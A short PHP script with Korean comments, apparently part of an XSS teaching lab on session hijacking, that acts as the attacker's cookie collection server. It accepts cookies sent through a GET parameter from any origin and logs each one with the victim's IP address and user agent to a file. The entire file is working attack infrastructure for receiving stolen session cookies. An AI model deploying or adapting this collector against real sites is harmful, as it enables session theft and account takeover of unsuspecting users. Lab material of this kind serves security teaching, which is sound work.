<?php
// 공격자 쿠키 수집 서버
// 실행: php -S localhost:9000 -t xss/05-session-hijack/attacker/

// CORS 허용 (이미지 요청 방식이라 불필요하지만 fetch 방식에도 대비)
header('Access-Control-Allow-Origin: *');
header('Content-Type: text/plain; charset=UTF-8');

$logFile = __DIR__ . '/log.txt';
$cookie = $_GET['c'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$time = date('Y-m-d H:i:s');
$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';

if ($cookie) {
  $entry = "[{$time}] IP: {$ip}\nCookie: {$cookie}\nUA: {$ua}\n" . str_repeat('-', 60) . "\n";
  file_put_contents($logFile, $entry, FILE_APPEND);
  echo "OK";
} else {
  echo "No cookie received";
}
?>
